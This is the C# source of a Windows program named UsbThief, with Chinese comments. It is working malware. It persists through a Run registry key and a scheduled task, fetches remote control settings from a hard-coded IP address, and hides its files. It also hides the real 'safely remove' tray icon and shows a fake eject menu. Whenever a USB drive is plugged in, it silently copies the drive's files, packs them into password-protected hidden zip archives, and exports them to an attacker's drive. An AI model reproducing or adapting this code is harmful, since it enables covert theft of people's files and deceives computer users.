using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Ionic.Zip;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using Newtonsoft.Json;
using NLog;

namespace UsbThief
{
    public partial class Form1 : Form
    {
        #region 声明变量
        public const int innerVer = 0;
        public string workspace = Application.StartupPath + @"\data\diskcache\files\";
        public bool showRealMenu = false;
        public bool fc2c = false;
        public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
        public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
        public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //审批要求删除一个设备或媒体作品。任何应用程序也不能否认这一要求，并取消删除。
        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //请求删除一个设备或媒体片已被取消。
        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //一个设备或媒体片已被删除。
        public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。
        public Logger logger = LogManager.GetCurrentClassLogger();
        public SynchronizationContext mainThreadSynContext;
        public Status sta = Status.none;
        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
        public UsbDevice currentDevice = new UsbDevice { name = "none", ser = "none" };
        public enum Status
        {
            none,
            copying,
            compressing,
            exporting,
            exported
        }
        public struct Config
        {
            public bool enable;
            public bool suicide;
            public int ver;
            public string update;
            public List<string> exts;
            public int sizeLim;
            public string volName;
        }
        public struct UsbDevice
        {
            public string name;
            public string ser;
        }
        #endregion
        #region 初始化
        public Form1()
        {
            string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
            if (args.Length < 2 || args[1] != "-run")
            {
                Environment.Exit(0);
            }
            InitializeComponent();
            logger.Info("UsbThief已启动");
            logger.Info("innerVer：" + innerVer);
            mainThreadSynContext = SynchronizationContext.Current;
            notifyIcon1.MouseUp += NotifyIcon1_MouseUp;
            notifyIcon1.ContextMenuStrip.Items[0].Click += Item0_Click;
            notifyIcon1.ContextMenuStrip.Items[2].Click += Item2_Click;
            try
            {
                if (!Directory.Exists(workspace))
                {
                    Directory.CreateDirectory(workspace);
                }
            }
            catch (Exception e)
            {
                logger.Error("无法创建工作区目录：\n" + e);
            }
            HideFiles(workspace);
            try
            {
                string path = Application.ExecutablePath;
                RegistryKey rk = Registry.CurrentUser;
                RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                if (rk2.GetValue("Disk Manager") == null)
                {
                    rk2.SetValue("Disk Manager", path + " -run");
                    logger.Info("已设置开机启动");
                }
                rk2.Close();
                rk.Close();
            }
            catch (Exception e)
            {
                logger.Error("无法设置开机启动:\n" + e);
            }
            try
            {
                if (TaskService.Instance.FindTask("Clean Files") == null)
                {
                    TaskService.Instance.AddTask("Clean Files", new WeeklyTrigger { DaysOfWeek = DaysOfTheWeek.Friday, StartBoundary = DateTime.Parse("2019-09-27 09:00") }, new ExecAction { Path = Application.StartupPath + "\\fileassistant.exe", Arguments = "-clean" });
                    logger.Info("已设置计划任务");
                }
            }
            catch (Exception e)
            {
                logger.Error("无法设置计划任务:\n" + e);

            }
            Thread t = new Thread(() =>
            {
                try
                {
                    WebClient client = new WebClient
                    {
                        Encoding = Encoding.UTF8
                    };
                    string text = client.DownloadString("http://111.231.202.181/update.txt");
                    logger.Info("获取到网络配置：\n" + text);
                    conf = JsonConvert.DeserializeObject<Config>(text);
                }
                catch (Exception e)
                {
                    logger.Error("获取网络配置失败：\n" + e);
                }
            });
            t.Start();
            t.Join();
            if (conf.suicide == true)
            {
                logger.Info("Bye World~");
                Process.Start(Application.StartupPath + "\\fileassistant.exe", "-suicide");
                Environment.Exit(0);
            }
            if (innerVer < conf.ver && (conf.update != null && conf.update != ""))
            {
                logger.Info("检测到新版本，即将启动助手程序");
                Process.Start(Application.StartupPath + "\\fileassistant.exe", "-update=" + conf.update);
                Environment.Exit(0);
            }
            if (conf.enable)
            {
                try
                {
                    if (!File.Exists(Application.StartupPath + "\\status"))
                    {
                        FileStream fs1 = new FileStream(Application.StartupPath + "\\status", FileMode.Create, FileAccess.Write);
                        fs1.Close();
                    }
                    Dictionary<string, string> devices = new Dictionary<string, string>();
                    StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                    string line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        string tmpSer = line.Split(':')[0];
                        string status = line.Split(':')[1];
                        if (!devices.ContainsKey(tmpSer))
                            devices.Add(tmpSer, status);
                    }
                    sr.Close();
                    foreach (var item in devices)
                    {
                        if (item.Value == Status.copying.ToString() || item.Value == Status.compressing.ToString())
                        {
                            Thread compT = new Thread(new ParameterizedThreadStart(Compress));
                            compT.Start(item.Key);
                        }
                    }
                }
                catch (Exception)
                {
                    logger.Info("初始化状态文件失败");
                }
            }
            else
            {
                logger.Info("部分功能已关闭");
            }
        }
        #endregion
        #region 窗口加载
        private void Form1_Load(object sender, EventArgs e)
        {
            logger.Info("窗体已加载");
            SetVisibleCore(false);
            logger.Info("窗体已隐藏");
        }
        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(value);
        }
        #endregion
        #region 托盘图标相关
        private void NotifyIcon1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                MethodInfo mi = typeof(NotifyIcon).GetMethod("ShowContextMenu", BindingFlags.Instance | BindingFlags.NonPublic);
                mi.Invoke(notifyIcon1, null);
            }
        }
        private void Item0_Click(object sender, EventArgs e)
        {
            Process.Start("control", "printers");
            logger.Info("一本正经地打开控制面板，原来真有人会按这个键");
        }
        private void Item2_Click(object sender, EventArgs e)
        {
            //假装弹出
            notifyIcon1.ShowBalloonTip(5000);
            Thread.Sleep(5000);
            notifyIcon1.Visible = false;
            logger.Info("用户以为他弹出了设备，其实并没有~");
        }
        #endregion
        #region 监听Usb插入消息
        protected override void WndProc(ref Message m)
        {
            try
            {
                if (m.Msg == WM_DEVICECHANGE && conf.enable)
                {
                    int wp = m.WParam.ToInt32();
                    if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
                    {
                        if (wp == DBT_DEVICEARRIVAL)
                        {
                            Thread copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                if (drive.DriveType == DriveType.Removable)
                                {
                                    bool newDevice = false;
                                    Thread th = new Thread(() =>
                                    {
                                        if (currentDevice.name == "none" && currentDevice.ser == "none" && (sta != Status.exporting || sta != Status.compressing))
                                        {
                                            string ser = GetUsbSer(drive.Name);
                                            if (ser != null)
                                            {
                                                currentDevice.name = drive.Name;
                                                currentDevice.ser = GetUsbSer(drive.Name);
                                                newDevice = true;
                                                logger.Info("USB设备“" + currentDevice.ser + "”已插入");
                                            }
                                        }
                                    });
                                    th.Start();
                                    th.Join();//等待获取盘符结束再继续
                                    if (newDevice)
                                    {
                                        HideRealMenu();
                                        if (!showRealMenu)
                                        {
                                            notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
                                            notifyIcon1.Visible = true;
                                        }
                                        if (drive.VolumeLabel != conf.volName)
                                        {
                                            WriteSta(currentDevice.ser, Status.copying);
                                            string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
                                            copyT.Start(para);
                                        }
                                        else
                                        {
                                            logger.Info("目标Usb设备“" + drive.VolumeLabel + "”已插入，不会对其进行复制操作");
                                            try
                                            {
                                                //List<string> devices = new List<string>();
                                                //第二个bool指的是是否强制导出，如果之前导出过程中设备拔出导致状态停留在exporting，那么就强制导出
                                                Dictionary<string, bool> devices = new Dictionary<string, bool>();
                                                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                                                string line;
                                                while ((line = sr.ReadLine()) != null)
                                                {
                                                    string tmpSer = line.Split(':')[0];
                                                    string status = line.Split(':')[1];
                                                    if (status == Status.none.ToString() && !devices.ContainsKey(tmpSer))
                                                    {
                                                        devices.Add(tmpSer, false);
                                                    }
                                                    else if (status == Status.exporting.ToString() && !devices.ContainsKey(tmpSer))
                                                    {
                                                        devices.Add(tmpSer, true);
                                                    }
                                                }
                                                sr.Close();
                                                string[] files = Directory.GetFiles(workspace, "*.zip");
                                                foreach (var file in files)
                                                {
                                                    foreach (var item in devices)
                                                    {
                                                        if (file.Substring(file.LastIndexOf("\\") + 1) == item.Key + ".zip")
                                                        {
                                                            string tar = currentDevice.name + item.Key + ".zip";
                                                            try
                                                            {
                                                                if (File.Exists(tar))
                                                                {
                                                                    FileInfo fi1 = new FileInfo(file);
                                                                    FileInfo fi2 = new FileInfo(tar);
                                                                    if (fi1.LastWriteTime > fi2.LastWriteTime || item.Value == true)
                                                                    {
                                                                        WriteSta(item.Key, Status.exporting);
                                                                        logger.Info("正在导出文件：" + file);
                                                                        File.Copy(file, currentDevice.name + item.Key + ".zip", true);
                                                                        WriteSta(item.Key, Status.exported);
                                                                        logger.Info("导出完成：" + currentDevice.name + item.Key + ".zip");
                                                                    }
                                                                    else
                                                                    {
                                                                        WriteSta(item.Key, Status.exported);
                                                                    }
                                                                }
                                                                else
                                                                {
                                                                    WriteSta(item.Key, Status.exporting);
                                                                    logger.Info("正在导出文件：" + file);
                                                                    File.Copy(file, currentDevice.name + item.Key + ".zip");
                                                                    WriteSta(item.Key, Status.exported);
                                                                    logger.Info("导出完成：" + currentDevice.name + item.Key + ".zip");
                                                                }
                                                            }
                                                            catch (Exception e)
                                                            {

                                                                logger.Error("文件导出失败：\n" + e);
                                                            }
                                                        }
                                                    }
                                                }

                                            }
                                            catch (Exception e)
                                            {
                                                logger.Error("读取状态文件失败：\n" + e);
                                            }
                                        }
                                    }
                                    break;
                                }
                            }
                        }
                        else
                        {
                            DriveInfo[] ds = DriveInfo.GetDrives();
                            bool exist = false;
                            foreach (DriveInfo drive in ds)
                            {
                                if (drive.Name == currentDevice.name)
                                    exist = true;
                                continue;
                            }
                            if (!exist && currentDevice.name != "none" && currentDevice.ser != "none")
                            {
                                logger.Info("USB设备“" + currentDevice.ser + "”已拔出");
                                currentDevice.name = "none";
                                currentDevice.ser = "none";
                                notifyIcon1.Visible = false;
                                HideRealMenu(true);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                logger.Error("发生异常：\n" + ex);
            }
            base.WndProc(ref m);
        }
        #endregion
        #region 写状态文件
        private void WriteSta(string ser, Status s)
        {
            sta = s;
            try
            {
                Dictionary<string, string> devices = new Dictionary<string, string>();
                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    string tmpSer = line.Split(':')[0];
                    string status = line.Split(':')[1];
                    if (tmpSer == ser)
                    {
                        continue;
                    }
                    devices.Add(tmpSer, status);
                }
                sr.Close();
                devices.Add(ser, s.ToString());
                FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.Create);
                StreamWriter sw = new StreamWriter(fs);
                foreach (var item in devices)
                {
                    sw.WriteLine(item.Key + ":" + item.Value);
                }
                sw.Close();
            }
            catch (Exception)
            {
                try
                {
                    FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.OpenOrCreate);
                    StreamWriter sw = new StreamWriter(fs);
                    sw.WriteLine(ser + ":" + s.ToString());
                    sw.Close();
                }
                catch (Exception e)
                {
                    logger.Info("写入状态失败：\n" + e);
                }
            }
        }
        #endregion
        #region 隐藏文件
        private void HideFiles(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    DirectoryInfo d = new DirectoryInfo(path);
                    FileSystemInfo[] fsinfos = d.GetFileSystemInfos();
                    foreach (FileSystemInfo fsinfo in fsinfos)
                    {
                        File.SetAttributes(fsinfo.FullName, FileAttributes.Hidden);
                        if (fsinfo is DirectoryInfo)     //判断是否为文件夹
                        {
                            HideFiles(fsinfo.FullName);//递归调用
                        }
                    }
                }
            }
            catch (Exception e)
            {
                logger.Error("无法将工作目录设为隐藏：\n" + e);
            }
        }
        #endregion
        #region 隐藏/显示“安全弹出”托盘图标
        private void HideRealMenu(bool show = false)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray", true);
                if (show)
                {
                    logger.Info("尝试显示安全弹出托盘图标");
                    key.DeleteValue("Services", false);
                }
                else
                {
                    logger.Info("尝试隐藏安全弹出托盘图标");
                    key.SetValue("Services", 29, RegistryValueKind.DWord);
                }
                Process.Start("systray");
                logger.Info("安全弹出托盘图标已隐藏/显示");
            }
            catch (Exception e)
            {
                showRealMenu = true;
                logger.Info("安全弹出托盘图标无法隐藏/显示：\n" + e);
            }
        }
        #endregion
        #region 获取Usb设备序列号
        private string GetUsbSer(string driName)
        {
            using (ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + driName.Replace("\\", "") + "\""))
            {
                try
                {
                    return disk.Properties["VolumeSerialNumber"].Value.ToString();
                }
                catch (Exception e)
                {
                    logger.Error("设备序列号获取失败：\n" + e);
                    return null;
                }
            }
        }
        #endregion
        #region 检测扩展名
        private bool CheckExt(string ext)
        {
            if (conf.exts == null || conf.exts.Count == 0)
            {
                return true;
            }
            else
            {
                foreach (var item in conf.exts)
                {
                    if (item.ToLower() == ext.ToLower())
                    {
                        return true;
                    }
                }
                return false;
            }
        }
        #endregion
        #region 复制文件
        private void Copy2Disk(object obj)
        {
            string[] str = (string[])obj;
            WriteSta(str[0], Status.copying);
            CopyLoop(str[1], str[2]);
            HideFiles(workspace);
            mainThreadSynContext.Post(new SendOrPostCallback(CopyDoneCallback), null);
        }
        private void CopyLoop(string sourcePath, string targetPath)
        {
            try
            {
                fc2c = false;
                DirectoryInfo sourceInfo = new DirectoryInfo(sourcePath);
                if (!Directory.Exists(targetPath))
                    Directory.CreateDirectory(targetPath);
                foreach (FileSystemInfo fsi in sourceInfo.GetFileSystemInfos())
                {
                    string targetFileName = Path.Combine(targetPath, fsi.Name);
                    if (fsi is FileInfo)
                    {   //如果是文件，复制文件
                        FileInfo fi1 = new FileInfo(fsi.FullName);
                        if (CheckExt(fi1.Extension))
                        {
                            if (File.Exists(targetFileName))
                            {
                                FileInfo fi2 = new FileInfo(targetFileName);
                                if (fi1.LastWriteTime > fi2.LastWriteTime)
                                {
                                    fc2c = true;
                                    logger.Info("正在复制文件：" + fsi.FullName);
                                    File.Copy(fsi.FullName, targetFileName, true);
                                }
                            }
                            else
                            {
                                if (fi1.Length < conf.sizeLim * (long)1048576 || conf.sizeLim == 0)
                                {
                                    fc2c = true;
                                    logger.Info("正在复制文件：" + fsi.FullName);
                                    File.Copy(fsi.FullName, targetFileName);
                                }
                            }
                        }
                    }
                    else //如果是文件夹，新建文件夹，递归
                    {
                        CopyLoop(fsi.FullName, targetFileName);
                    }
                }
            }
            catch (Exception e)
            {
                logger.Error("文件复制出错：\n" + e);
            }
        }
        private void CopyDoneCallback(object state)
        {
            logger.Info("复制完成");
            if (fc2c)
            {
                logger.Info("压缩线程启动");
                Thread compT = new Thread(new ParameterizedThreadStart(Compress));
                compT.Start(currentDevice.ser);
            }
            else
            {
                WriteSta(currentDevice.ser, Status.none);
            }
        }
        #endregion
        #region 压缩文件
        private void Compress(object s)
        {
            string ser = (string)s;
            WriteSta(ser, Status.compressing);
            try
            {
                string path = workspace + ser;
                string dest = path + ".zip";
                if (File.Exists(dest))
                    File.Delete(dest);
                logger.Info("正在压缩：" + path);
                using (ZipFile zip = new ZipFile(dest, Encoding.UTF8))
                {
                    zip.Password = "qiegewala";
                    zip.AddDirectory(path, ser);
                    zip.Save();
                }
                File.SetAttributes(dest, FileAttributes.Hidden);
            }
            catch (Exception e)
            {
                logger.Error("压缩失败：\n" + e);
            }
            WriteSta(ser, Status.none);
            logger.Info("压缩完成");
        }
        #endregion
    }
}
